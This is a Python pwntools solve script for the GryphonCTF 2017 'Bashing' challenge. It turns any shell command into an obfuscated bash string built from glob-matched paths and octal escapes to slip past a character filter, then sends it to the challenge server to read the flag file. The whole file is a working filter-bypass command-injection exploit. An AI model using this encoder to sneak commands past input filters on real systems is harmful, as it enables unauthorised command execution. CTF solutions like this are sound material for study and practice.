#! /usr/bin/env python3
##
# Created for GryphonCTF 2017_Bashing
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
# Imports
from pwn import *
import re
import string

# Functions
def get_command(cmd):
    """Builds command 
    
    Using printf and bash functions, build a command that will run successfully.
    
    Args:
        cmd: String command, can be anything
    
    Returns:
        Compiled command string
        String
    """
    PRINT_FUNCTION = "n(){ /*/??n/???n?f ${@}; };"
    WRAPPER_FUNCTION = "f(){ n ${#}; };"

    # For letter in cmd
    newcmd = []
    for char in cmd:
        newchar = "n \\\\\\\\`"
        octal = oct(ord(char))[2:]

        # For number in octal
        for number in octal:
            number = int(number)
            newchar += "f" + (' ""' * number) + "; "

        # Add new char to new command
        newcmd.append(f"{newchar.strip()}`;")

    # Return command
    newcmd = " ".join(newcmd)
    return f"{PRINT_FUNCTION} {WRAPPER_FUNCTION} $(n $({newcmd}))"

# Create tube
t = remote('pwn1.chal.gryphonctf.com', 17345)

# Logging
with log.progress("Cracking the Da Vinci Code...") as p:
    # Get rid of header
    t.recvuntil("> ")
    t.sendline("h")
    t.recvuntil("> ")

    # Get flag file
    t.sendline(get_command("cat /bin/this*"))
    response = t.clean(1).decode(errors="ignore").strip()

    # Prepare flag
    flag = ""

    # Add up all hexadecimal values in "assembly" dump
    for line in response.split("\n"):
        match = re.findall("0x[0-9a-z]{2}$", line)
        if match:
            hexa = match[0].strip()
            char = chr(int(hexa, 16))
            if char in string.printable:
                flag += char

    # Print flag
    p.success(flag[::-1])
